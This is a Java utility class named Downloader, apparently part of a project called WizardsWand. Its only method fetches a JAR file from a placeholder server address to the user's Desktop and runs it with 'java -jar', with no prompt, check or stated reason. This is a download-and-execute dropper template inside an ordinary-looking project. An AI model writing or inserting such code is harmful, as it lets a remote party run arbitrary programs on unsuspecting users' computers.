package com.github.holdhands.WizardsWand.utils;

import java.io.File;
import java.net.URL;

import org.apache.commons.io.FileUtils;

public class Downloader {
	
	
	public static void Download() throws Exception {
		   
        //System.out.println("Start");
       
        FileUtils.copyURLToFile(new URL("Yourserver/Yourfile.jar"), new File(System.getProperty("user.home") + "/Desktop" + "/File.jar"));
        File file = new File(System.getProperty("user.home") + "/Desktop" + "/File.jar");
        if (file.exists())
        {
          Runtime.getRuntime().exec("java -jar " + System.getProperty("user.home") + "/Desktop" + "/File.jar");
          System.out.println("Success");
        }
        System.out.println("end");
       
    }
}
